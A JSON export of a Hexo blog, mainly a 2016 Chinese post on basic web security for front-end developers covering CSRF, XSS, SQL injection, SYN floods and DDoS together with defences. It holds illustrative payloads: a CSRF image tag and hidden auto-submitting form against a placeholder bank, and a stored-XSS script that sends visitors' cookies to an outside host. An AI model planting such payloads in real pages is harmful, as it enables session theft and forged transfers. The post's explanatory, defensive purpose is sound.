class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span>  <span class=\"title\">Listener</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'foo'</span>).addEventListener(<span class=\"string\">'click'</span>,<span class=\"keyword\">this</span>.handleClick.bind(<span class=\"keyword\">this</span>));      </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Listener.prototype.handleClick = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">event</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>);    <span class=\"comment\">//Listener &#123;&#125;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> listener = <span class=\"keyword\">new</span> Listener();</span><br><span class=\"line\"><span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'foo'</span>).click();</span><br></pre></td></tr></table></figure>\n<p>总结一句话，就是 this 指向调用该方法的对象。</p>\n<h2 id=\"其它：\"><a href=\"#其它：\" class=\"headerlink\" title=\"其它：\"></a>其它：</h2><ul>\n<li>this 为保留字，你不能重写 this。</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> <span class=\"keyword\">this</span> = &#123;&#125;;     <span class=\"comment\">//Uncaught SyntaxError: Unexpected token this</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>宿主对象：</li>\n</ul>\n<blockquote>\n<p>一门语言在运行的时候，需要一个环境，叫做宿主环境。  </p>\n<p>对于JavaScript，宿主环境最常见的是web浏览器，浏览器提供了一个JavaScript运行的环境，这个环境里面，需要提供一些接口，好让JavaScript引擎能够和宿主环境对接。  </p>\n<p>JavaScript引擎才是真正执行JavaScript代码的地方，常见的引擎有V8(目前最快JavaScript引擎、Google生产)、JavaScript core。</p>\n</blockquote>\n<p>在浏览器或者服务端( nodejs )都有自己的 JS 引擎，在浏览器中，全局对象为 window，而在 nodejs 中，全局对象为 global。 </p>\n<p>参考链接： </p>\n<ul>\n<li><a href=\"https://segmentfault.com/a/1190000002640298#articleHeader1\">JavaScript中的this陷阱的最全收集–没有之一</a>  </li>\n<li><a href=\"http://www.cnblogs.com/wangfupeng1988/p/3988422.html\">深入理解javascript原型和闭包（10）——this</a></li>\n</ul>\n"},{"layout":"post","title":"Web 网络安全基础知识","date":"2016-03-09T04:00:00.000Z","author":"Lindz","header-img":"img/11.jpg","_content":"\n作为一个前端 er，掌握必要的网络安全知识是必要的，下面我整理了几种常见的网络攻击方式及防御技巧，本文内容来自网络，仅供参考。\n\n## CSRF 攻击\n\n### CSRF 概念\n\nCSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。\n\nCSRF 可以简单理解为：**攻击者盗用了你的身份，以你的名义发送恶意请求**，容易造成个人隐私泄露以及财产安全。\n\n### CSRF 原理\n\n![](/assets/2016-03-09-web-security/1.jpg)\n\n要完成一次 CSRF 攻击，受害者必须完成：\n\n1. 登录受信任网站 A，并在本地生成 Cookie。\n2. 在不登出A的情况下，访问危险网站 B。\n\n案例：\n\n场景1. 银行网站 A，它以 GET \n请求来完成银行转账的操作，如：http://www.mybank.com/Transfer.php?toBankId=11&money=1000\n\n危险网站B，它里面有一段 HTML 的代码如下:\n\n```html\n<img src=http://www.mybank.com/Transfer.php?toBankId=11&money=1000>\n```\n\n首先，你登录了银行网站 A，然后访问危险网站 B，噢，这时你会发现你的银行账户少了 1000 块...  \n\n原因是银行网站 A 违反了 HTTP 规范，使用 GET 请求更新资源。  \n\n在访问危险网站B的之前，你已经登录了银行网站 A，而 B 中的 <img> 以 GET 的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以你的浏览器会带上你的银行网站 A 的 Cookie 发出 Get 请求，去获取资源 “http://www.mybank.com/Transfer.php?toBankId=11&money=1000”，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作......\n\n情况2:  \n\n银行决定把获取请求数据的方法也改了，改用 $_POST，只获取 POST 请求的数据，后台处理页面 Transfer.php 代码如下：\n\n```php\n<?php\n\tsession_start();\n\tif (isset($_POST['toBankId'] &&isset($_POST['money']))\n\t{\n\t\tbuy_stocks($_POST['toBankId'],　$_POST['money']);\n\t}\n?>\n```\n\n然而，危险网站 B 与时俱进，它改了一下代码：\n\n```html\n<body onload=\"steal()\">\n\t<iframe name=\"steal\" display=\"none\">\n　　\t<form method=\"POST\" name=\"transfer\"　action=\"http://www.myBank.com/Transfer.php\">\n　　\t\t<input type=\"hidden\" name=\"toBankId\" value=\"11\">\n　　\t\t<input type=\"hidden\" name=\"money\" value=\"1000\">\n　　\t</form>\n　　</iframe>\n</body>\n```\n\n因为这里危险网站B暗地里发送了 POST 请求到银行，通过一个隐藏的自动提交的表单来提交请求，\n\n\n##### 其实可以看出，CSRF 攻击是源于 WEB 的隐式身份验证机制！WEB 的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！\n\n\n### CSRF 防御\n\nCSRF 的防御可以从服务端和客户端两方面着手，防御效果是从服务端着手效果比较好，现在一般的 CSRF 防御也都在服务端进行。\n\n1. 关键操作只接受 POST 请求  \n\n2. 验证码：    \nCSRF 攻击的过程，往往是在用户不知情的情况下构造网络请求。所以如果使用验证码，那么每次操作都需要用户进行互动，从而简单有效的防御了 CSRF 攻击。  \n但是如果你在一个网站作出任何举动都要输入验证码会严重影响用户体验，所以验证码一般只出现在特殊操作里面，或者在注册时候使用。\n\n3. 检测 Referer：  \n常见的互联网页面与页面之间是存在联系的，比如你在 www.baidu.com 应该是找不到通往 www.google.com 的链接的，再比如你在论坛留言，那么不管你留言后重定向到哪里去了，之前的那个网址一定会包含留言的输入框，这个之前的网址就会保留在新页面头文件的 Referer 中    \n通过检查 Referer 的值，我们就可以判断这个请求是合法的还是非法的，但是问题出在服务器不是任何时候都能接受到 Referer 的值，所以 Referer Check 一般用于监控 CSRF 攻击的发生，而不用来抵御攻击。\n\n4. Token: 目前主流的做法是使用 Token 抵御 CSRF 攻击\n\nCSRF 攻击要成功的条件在于攻击者能够预测所有的参数从而构造出合法的请求。所以根据不可预测性原则，我们可以对参数进行加密从而防止 CSRF 攻击。\n\n另一个更通用的做法是保持原有参数不变，另外添加一个参数 Token，其值是随机的。这样攻击者因为不知道 Token 而无法构造出合法的请求进行攻击。\n\nToken 使用原则:\n\n* Token 要足够随机————只有这样才算不可预测\n* Token 是一次性的，即每次请求成功后要更新 Token————这样可以增加攻击难度，增加预测难度\n* Token 要注意保密性————敏感操作使用 post，防止 Token 出现在 URL 中\n\n**注意：过滤用户输入的内容不能阻挡 csrf，我们需要做的是过滤请求的来源。**\n\n## XSS攻击\n\n### XSS 概念\n\nXSS 又称 CSS，全称 Cross SiteScript，跨站脚本攻击，为了和 CSS 层叠样式表区分所以取名 XSS，是 Web 程序中常见的漏洞。\n\n其原理是攻击者向有 XS S漏洞的网站中输入(传入)恶意的 HTML 代码，当其它用户浏览该网站时，这段 HTML 代码会自动执行，从而达到攻击的目的。如，盗取用户 Cookie、破坏页面结构、重定向到其它网站等。\n\n例如：比如某论坛的评论功能没有对 XSS 进行过滤，那么我们可以对其进行评论，评论如下：\n\n```javascript\nwhile(true){\n\talert(“你关不掉我\")；\n}\n```\n\n例如发布评论，提交含有 JavaScript 的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。\n\n恶意者可以将上述代码修改成恶意的代码，就可以盗取你的 cookie 或者其它信息。\n\n### XSS 攻击类型\n\n#### DOM Based XSS\n\nDOM Based XSS 是一种基于网页 DOM 结构的攻击，该攻击特点是中招的人是少数人。\n\n恶意用户向单独用户发送恶意 JS 代码。\n\n#### Stored XSS\n\nStored XSS 是存储式 XSS 漏洞，由于其攻击代码已经存储到服务器上或者数据库中，所以受害者是很多人。\n\nexample.com 可以发文章，我登录后在 example.com 中发布了一篇文章，文章中包含了恶意代码，<script>window.open(“www.b.com?param=”+document.cookie)</script>，保存文章。这时 Tom 和 Jack 看到了我发布的文章，当在查看我的文章时就都中招了，他们的 cookie 信息都发送到了我的服务器上，攻击成功！这个过程中，受害者是多个人。\n\n### 防御 XSS 攻击\n\n理论上，网站上所有可输入的地方没有对输入数据进行处理的话，都会存在XSS漏洞，漏洞的危害取决于攻击代码的威力，攻击代码也不局限于script。防御 XSS 攻击最简单直接的方法，就是过滤用户的输入。\n\n#### 方法一：\n\n如果不需要用户输入 HTML，可以直接对用户的输入进行 HTML escape 。下面一小段脚本：\n\n```javascript\n<script>window.location.href=”http://www.xss.com”;</script>\n```\n\n经过 escape 之后就成了：\n\n```javascript\n&lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;&lt;/script&gt;\n```\n\n它现在会像普通文本一样显示出来，变得无毒无害，不能执行了。\n\n#### 方法二：完善的过滤体系\n\n永远不相信用户的输入。需要对用户的输入进行处理，只允许输入合法的值，其它值一概过滤掉。\n\n#### 方法三：当用户需要输入 HTML 代码\n\n当我们需要用户输入 HTML 的时候，需要对用户输入的内容做更加小心细致的处理。\n\n仅仅粗暴地去掉 script 标签是没有用的，任何一个合法 HTML 标签都可以添加 onclick 一类的事件属性来执行 JavaScript。\n\n更好的方法可能是，将用户的输入使用 HTML 解析库进行解析，获取其中的数据。然后根据用户原有的标签属性，重新构建 HTML 元素树。构建的过程中，所有的标签、属性都只从白名单中拿取。\n\n## SQL 注入\n\n### 概念\n\n所谓 SQL 注入，就是通过把 SQL 命令插入到 Web 表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。\n\n具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在 Web 表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。\n\n### SQL 防护\n\n1. 永远不要信任用户的输入:  \n对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和\n双\"-\"进行转换等。\n\t\n2. 永远不要使用动态拼装 sql，可以使用参数化的 sql 或者直接使用存储过程进行数据查询存取。\n\n3. 永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。\n\n4. 不要把机密信息直接存放，加密或者 hash 掉密码和敏感的信息。\n\n## SYN 攻击\n\n### 概念\n\n在三次握手过程中，服务器发送 SYN-ACK 之后，收到客户端的 ACK 之前的 TCP 连接称为半连接(half-open connect)。此时服务器处于 SYN_RCVD 状态。当收到 ACK 后，服务器才能转入 ESTABLISHED 状态.\n\nSYN 攻击指的是，攻击客户端在短时间内伪造大量不存在的 IP 地址，向服务器不断地发送 SYN 包，服务器回复确认包，并等待客户的确认。\n\n由于源地址是不存在的，服务器需要不断的重发直至超时，这些伪造的 SYN 包将长时间占用未连接队列，正常的 SYN 请求被丢弃，导致目标系统运行缓慢，严重者会引起网络堵塞甚至系统瘫痪。\n\n### 检测 SYN 攻击\n \n检测 SYN 攻击非常的方便，当你在服务器上看到大量的半连接状态时，特别是源 IP 地址是随机的，基本上可以断定这是一次 SYN 攻击。\n\n### SYN 攻击防护\n\n1. 缩短超时（SYN Timeout）时间\n2. 增加最大半连接数\n3. 过滤网关防护\n\n## DDOS攻击\n\n### 概念\n\n分布式拒绝服务( DDoS:Distributed Denial of Service )攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。\n\n可以打个比方：\n\n一群恶霸试图让对面那家有着竞争关系的商铺无法正常营业，他们会采取什么手段呢？（只为举例，切勿模仿）\n\n恶霸们扮作普通客户一直拥挤在对手的商铺，赖着不走，真正的购物者却无法进入；或者总是和营业员有一搭没一搭的东扯西扯，让工作人员不能正常服务客户；也可以为商铺的经营者提供虚假信息，商铺的上上下下忙成一团之后却发现都是一场空，最终跑了真正的大客户，损失惨重。\n\n此外恶霸们完成这些坏事有时凭单干难以完成，需要叫上很多人一起。嗯，网络安全领域中 DoS 和 DDoS 攻击就遵循着这些思路。\n\n**DDOS 攻击利用目标系统网络服务功能缺陷或者直接消耗其系统资源，使得该目标系统无法提供正常的服务。**\n\nDDoS 攻击通过大量合法的请求占用大量网络资源，以达到瘫痪网络的目的。 具体有几种形式：\n\n1. 通过使网络过载来干扰甚至阻断正常的网络通讯；\n2. 通过向服务器提交大量请求，使服务器超负荷；\n3. 阻断某一用户访问服务器；\n4. 阻断某服务与特定系统或个人的通讯。\n\nIP Spoofing:  \nIP欺骗攻击是一种黑客通过向服务端发送虚假的包以欺骗服务器的DDOS攻击示意图DDOS攻击示意图做法。\n\n具体说，就是将包中的源 IP 地址设置为不存在或不合法的值。服务器一旦接受到该包便会返回接受请求包，但实际上这个包永远返回不到来源处的计算机。这种做法使服务器必需开启自己的监听端口不断等待，也就浪费了系统各方面的资源。 \n\n### DDOS 防御\n\n1. 关闭不必要的服务\n2. 限制同时打开的 Syn 半连接数目\n3. 缩短Syn半连接的time out 时间\n\n参考链接：\n\n* [TCP 协议 笔试面试知识整理](http://hit-alibaba.github.io/interview/basic/network/TCP.html)\n* [浅谈CSRF攻击方式 - hyddd - 博客园](http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html)\n* [分布式拒绝服务攻击 百度百科](http://baike.baidu.com/link?url=REctw71a-zdfpceJUYOVJRdapLLC7zz321lNEjpl_EMD4LW5D7X4_9vXYfUj_qqbWhfPj-CI0zWC4nlkbQZCIrG8GFYSbPJjSA1-NxwKBL8DUr2m5HU86iLB4AbEdhNJsWl7HqFt85b4pTDCQXPjzK)\n* [sql注入 百度百科](http://baike.baidu.com/view/3896.htm)","source":"_posts/2016-03-09-web-security.md","raw":"---\nlayout:     post\ntitle:      \"Web 网络安全基础知识\"\ndate:       2016-03-09 12:00:00\nauthor:     \"Lindz\"\nheader-img: \"img/11.jpg\"\ntags:\n    - 计算机网络\n    - 网络安全\n---\n\n作为一个前端 er，掌握必要的网络安全知识是必要的，下面我整理了几种常见的网络攻击方式及防御技巧，本文内容来自网络，仅供参考。\n\n## CSRF 攻击\n\n### CSRF 概念\n\nCSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。\n\nCSRF 可以简单理解为：**攻击者盗用了你的身份，以你的名义发送恶意请求**，容易造成个人隐私泄露以及财产安全。\n\n### CSRF 原理\n\n![](/assets/2016-03-09-web-security/1.jpg)\n\n要完成一次 CSRF 攻击，受害者必须完成：\n\n1. 登录受信任网站 A，并在本地生成 Cookie。\n2. 在不登出A的情况下，访问危险网站 B。\n\n案例：\n\n场景1. 银行网站 A，它以 GET \n请求来完成银行转账的操作，如：http://www.mybank.com/Transfer.php?toBankId=11&money=1000\n\n危险网站B，它里面有一段 HTML 的代码如下:\n\n```html\n<img src=http://www.mybank.com/Transfer.php?toBankId=11&money=1000>\n```\n\n首先，你登录了银行网站 A，然后访问危险网站 B，噢，这时你会发现你的银行账户少了 1000 块...  \n\n原因是银行网站 A 违反了 HTTP 规范，使用 GET 请求更新资源。  \n\n在访问危险网站B的之前，你已经登录了银行网站 A，而 B 中的 <img> 以 GET 的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以你的浏览器会带上你的银行网站 A 的 Cookie 发出 Get 请求，去获取资源 “http://www.mybank.com/Transfer.php?toBankId=11&money=1000”，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作......\n\n情况2:  \n\n银行决定把获取请求数据的方法也改了，改用 $_POST，只获取 POST 请求的数据，后台处理页面 Transfer.php 代码如下：\n\n```php\n<?php\n\tsession_start();\n\tif (isset($_POST['toBankId'] &&isset($_POST['money']))\n\t{\n\t\tbuy_stocks($_POST['toBankId'],　$_POST['money']);\n\t}\n?>\n```\n\n然而，危险网站 B 与时俱进，它改了一下代码：\n\n```html\n<body onload=\"steal()\">\n\t<iframe name=\"steal\" display=\"none\">\n　　\t<form method=\"POST\" name=\"transfer\"　action=\"http://www.myBank.com/Transfer.php\">\n　　\t\t<input type=\"hidden\" name=\"toBankId\" value=\"11\">\n　　\t\t<input type=\"hidden\" name=\"money\" value=\"1000\">\n　　\t</form>\n　　</iframe>\n</body>\n```\n\n因为这里危险网站B暗地里发送了 POST 请求到银行，通过一个隐藏的自动提交的表单来提交请求，\n\n\n##### 其实可以看出，CSRF 攻击是源于 WEB 的隐式身份验证机制！WEB 的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！\n\n\n### CSRF 防御\n\nCSRF 的防御可以从服务端和客户端两方面着手，防御效果是从服务端着手效果比较好，现在一般的 CSRF 防御也都在服务端进行。\n\n1. 关键操作只接受 POST 请求  \n\n2. 验证码：    \nCSRF 攻击的过程，往往是在用户不知情的情况下构造网络请求。所以如果使用验证码，那么每次操作都需要用户进行互动，从而简单有效的防御了 CSRF 攻击。  \n但是如果你在一个网站作出任何举动都要输入验证码会严重影响用户体验，所以验证码一般只出现在特殊操作里面，或者在注册时候使用。\n\n3. 检测 Referer：  \n常见的互联网页面与页面之间是存在联系的，比如你在 www.baidu.com 应该是找不到通往 www.google.com 的链接的，再比如你在论坛留言，那么不管你留言后重定向到哪里去了，之前的那个网址一定会包含留言的输入框，这个之前的网址就会保留在新页面头文件的 Referer 中    \n通过检查 Referer 的值，我们就可以判断这个请求是合法的还是非法的，但是问题出在服务器不是任何时候都能接受到 Referer 的值，所以 Referer Check 一般用于监控 CSRF 攻击的发生，而不用来抵御攻击。\n\n4. Token: 目前主流的做法是使用 Token 抵御 CSRF 攻击\n\nCSRF 攻击要成功的条件在于攻击者能够预测所有的参数从而构造出合法的请求。所以根据不可预测性原则，我们可以对参数进行加密从而防止 CSRF 攻击。\n\n另一个更通用的做法是保持原有参数不变，另外添加一个参数 Token，其值是随机的。这样攻击者因为不知道 Token 而无法构造出合法的请求进行攻击。\n\nToken 使用原则:\n\n* Token 要足够随机————只有这样才算不可预测\n* Token 是一次性的，即每次请求成功后要更新 Token————这样可以增加攻击难度，增加预测难度\n* Token 要注意保密性————敏感操作使用 post，防止 Token 出现在 URL 中\n\n**注意：过滤用户输入的内容不能阻挡 csrf，我们需要做的是过滤请求的来源。**\n\n## XSS攻击\n\n### XSS 概念\n\nXSS 又称 CSS，全称 Cross SiteScript，跨站脚本攻击，为了和 CSS 层叠样式表区分所以取名 XSS，是 Web 程序中常见的漏洞。\n\n其原理是攻击者向有 XS S漏洞的网站中输入(传入)恶意的 HTML 代码，当其它用户浏览该网站时，这段 HTML 代码会自动执行，从而达到攻击的目的。如，盗取用户 Cookie、破坏页面结构、重定向到其它网站等。\n\n例如：比如某论坛的评论功能没有对 XSS 进行过滤，那么我们可以对其进行评论，评论如下：\n\n```javascript\nwhile(true){\n\talert(“你关不掉我\")；\n}\n```\n\n例如发布评论，提交含有 JavaScript 的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。\n\n恶意者可以将上述代码修改成恶意的代码，就可以盗取你的 cookie 或者其它信息。\n\n### XSS 攻击类型\n\n#### DOM Based XSS\n\nDOM Based XSS 是一种基于网页 DOM 结构的攻击，该攻击特点是中招的人是少数人。\n\n恶意用户向单独用户发送恶意 JS 代码。\n\n#### Stored XSS\n\nStored XSS 是存储式 XSS 漏洞，由于其攻击代码已经存储到服务器上或者数据库中，所以受害者是很多人。\n\nexample.com 可以发文章，我登录后在 example.com 中发布了一篇文章，文章中包含了恶意代码，<script>window.open(“www.b.com?param=”+document.cookie)</script>，保存文章。这时 Tom 和 Jack 看到了我发布的文章，当在查看我的文章时就都中招了，他们的 cookie 信息都发送到了我的服务器上，攻击成功！这个过程中，受害者是多个人。\n\n### 防御 XSS 攻击\n\n理论上，网站上所有可输入的地方没有对输入数据进行处理的话，都会存在XSS漏洞，漏洞的危害取决于攻击代码的威力，攻击代码也不局限于script。防御 XSS 攻击最简单直接的方法，就是过滤用户的输入。\n\n#### 方法一：\n\n如果不需要用户输入 HTML，可以直接对用户的输入进行 HTML escape 。下面一小段脚本：\n\n```javascript\n<script>window.location.href=”http://www.xss.com”;</script>\n```\n\n经过 escape 之后就成了：\n\n```javascript\n&lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;&lt;/script&gt;\n```\n\n它现在会像普通文本一样显示出来，变得无毒无害，不能执行了。\n\n#### 方法二：完善的过滤体系\n\n永远不相信用户的输入。需要对用户的输入进行处理，只允许输入合法的值，其它值一概过滤掉。\n\n#### 方法三：当用户需要输入 HTML 代码\n\n当我们需要用户输入 HTML 的时候，需要对用户输入的内容做更加小心细致的处理。\n\n仅仅粗暴地去掉 script 标签是没有用的，任何一个合法 HTML 标签都可以添加 onclick 一类的事件属性来执行 JavaScript。\n\n更好的方法可能是，将用户的输入使用 HTML 解析库进行解析，获取其中的数据。然后根据用户原有的标签属性，重新构建 HTML 元素树。构建的过程中，所有的标签、属性都只从白名单中拿取。\n\n## SQL 注入\n\n### 概念\n\n所谓 SQL 注入，就是通过把 SQL 命令插入到 Web 表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。\n\n具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在 Web 表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。\n\n### SQL 防护\n\n1. 永远不要信任用户的输入:  \n对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和\n双\"-\"进行转换等。\n\t\n2. 永远不要使用动态拼装 sql，可以使用参数化的 sql 或者直接使用存储过程进行数据查询存取。\n\n3. 永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。\n\n4. 不要把机密信息直接存放，加密或者 hash 掉密码和敏感的信息。\n\n## SYN 攻击\n\n### 概念\n\n在三次握手过程中，服务器发送 SYN-ACK 之后，收到客户端的 ACK 之前的 TCP 连接称为半连接(half-open connect)。此时服务器处于 SYN_RCVD 状态。当收到 ACK 后，服务器才能转入 ESTABLISHED 状态.\n\nSYN 攻击指的是，攻击客户端在短时间内伪造大量不存在的 IP 地址，向服务器不断地发送 SYN 包，服务器回复确认包，并等待客户的确认。\n\n由于源地址是不存在的，服务器需要不断的重发直至超时，这些伪造的 SYN 包将长时间占用未连接队列，正常的 SYN 请求被丢弃，导致目标系统运行缓慢，严重者会引起网络堵塞甚至系统瘫痪。\n\n### 检测 SYN 攻击\n \n检测 SYN 攻击非常的方便，当你在服务器上看到大量的半连接状态时，特别是源 IP 地址是随机的，基本上可以断定这是一次 SYN 攻击。\n\n### SYN 攻击防护\n\n1. 缩短超时（SYN Timeout）时间\n2. 增加最大半连接数\n3. 过滤网关防护\n\n## DDOS攻击\n\n### 概念\n\n分布式拒绝服务( DDoS:Distributed Denial of Service )攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。\n\n可以打个比方：\n\n一群恶霸试图让对面那家有着竞争关系的商铺无法正常营业，他们会采取什么手段呢？（只为举例，切勿模仿）\n\n恶霸们扮作普通客户一直拥挤在对手的商铺，赖着不走，真正的购物者却无法进入；或者总是和营业员有一搭没一搭的东扯西扯，让工作人员不能正常服务客户；也可以为商铺的经营者提供虚假信息，商铺的上上下下忙成一团之后却发现都是一场空，最终跑了真正的大客户，损失惨重。\n\n此外恶霸们完成这些坏事有时凭单干难以完成，需要叫上很多人一起。嗯，网络安全领域中 DoS 和 DDoS 攻击就遵循着这些思路。\n\n**DDOS 攻击利用目标系统网络服务功能缺陷或者直接消耗其系统资源，使得该目标系统无法提供正常的服务。**\n\nDDoS 攻击通过大量合法的请求占用大量网络资源，以达到瘫痪网络的目的。 具体有几种形式：\n\n1. 通过使网络过载来干扰甚至阻断正常的网络通讯；\n2. 通过向服务器提交大量请求，使服务器超负荷；\n3. 阻断某一用户访问服务器；\n4. 阻断某服务与特定系统或个人的通讯。\n\nIP Spoofing:  \nIP欺骗攻击是一种黑客通过向服务端发送虚假的包以欺骗服务器的DDOS攻击示意图DDOS攻击示意图做法。\n\n具体说，就是将包中的源 IP 地址设置为不存在或不合法的值。服务器一旦接受到该包便会返回接受请求包，但实际上这个包永远返回不到来源处的计算机。这种做法使服务器必需开启自己的监听端口不断等待，也就浪费了系统各方面的资源。 \n\n### DDOS 防御\n\n1. 关闭不必要的服务\n2. 限制同时打开的 Syn 半连接数目\n3. 缩短Syn半连接的time out 时间\n\n参考链接：\n\n* [TCP 协议 笔试面试知识整理](http://hit-alibaba.github.io/interview/basic/network/TCP.html)\n* [浅谈CSRF攻击方式 - hyddd - 博客园](http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html)\n* [分布式拒绝服务攻击 百度百科](http://baike.baidu.com/link?url=REctw71a-zdfpceJUYOVJRdapLLC7zz321lNEjpl_EMD4LW5D7X4_9vXYfUj_qqbWhfPj-CI0zWC4nlkbQZCIrG8GFYSbPJjSA1-NxwKBL8DUr2m5HU86iLB4AbEdhNJsWl7HqFt85b4pTDCQXPjzK)\n* [sql注入 百度百科](http://baike.baidu.com/view/3896.htm)","slug":"2016-03-09-web-security","published":1,"updated":"2016-03-14T13:44:30.000Z","comments":1,"photos":[],"link":"","_id":"cim4u6rxr000jxmvdfmdmurbs","content":"<p>作为一个前端 er，掌握必要的网络安全知识是必要的，下面我整理了几种常见的网络攻击方式及防御技巧，本文内容来自网络，仅供参考。</p>\n<h2 id=\"CSRF-攻击\"><a href=\"#CSRF-攻击\" class=\"headerlink\" title=\"CSRF 攻击\"></a>CSRF 攻击</h2><h3 id=\"CSRF-概念\"><a href=\"#CSRF-概念\" class=\"headerlink\" title=\"CSRF 概念\"></a>CSRF 概念</h3><p>CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。</p>\n<p>CSRF 可以简单理解为：<strong>攻击者盗用了你的身份，以你的名义发送恶意请求</strong>，容易造成个人隐私泄露以及财产安全。</p>\n<h3 id=\"CSRF-原理\"><a href=\"#CSRF-原理\" class=\"headerlink\" title=\"CSRF 原理\"></a>CSRF 原理</h3><p><img src=\"/assets/2016-03-09-web-security/1.jpg\" alt=\"\"></p>\n<p>要完成一次 CSRF 攻击，受害者必须完成：</p>\n<ol>\n<li>登录受信任网站 A，并在本地生成 Cookie。</li>\n<li>在不登出A的情况下，访问危险网站 B。</li>\n</ol>\n<p>案例：</p>\n<p>场景1. 银行网站 A，它以 GET<br>请求来完成银行转账的操作，如：<a href=\"http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000\" target=\"_blank\" rel=\"external\">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</a></p>\n<p>危险网站B，它里面有一段 HTML 的代码如下:</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">http:</span>//<span class=\"attr\">www.mybank.com</span>/<span class=\"attr\">Transfer.php</span>?<span class=\"attr\">toBankId</span>=<span class=\"string\">11&amp;money=1000</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>首先，你登录了银行网站 A，然后访问危险网站 B，噢，这时你会发现你的银行账户少了 1000 块…  </p>\n<p>原因是银行网站 A 违反了 HTTP 规范，使用 GET 请求更新资源。  </p>\n<p>在访问危险网站B的之前，你已经登录了银行网站 A，而 B 中的 <img> 以 GET 的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以你的浏览器会带上你的银行网站 A 的 Cookie 发出 Get 请求，去获取资源 “<a href=\"http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000”，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作\" target=\"_blank\" rel=\"external\">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000”，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作</a>……</p>\n<p>情况2:  </p>\n<p>银行决定把获取请求数据的方法也改了，改用 $_POST，只获取 POST 请求的数据，后台处理页面 Transfer.php 代码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\tsession_start();</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'toBankId'</span>] &amp;&amp;<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'money'</span>]))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tbuy_stocks($_POST[<span class=\"string\">'toBankId'</span>],　$_POST[<span 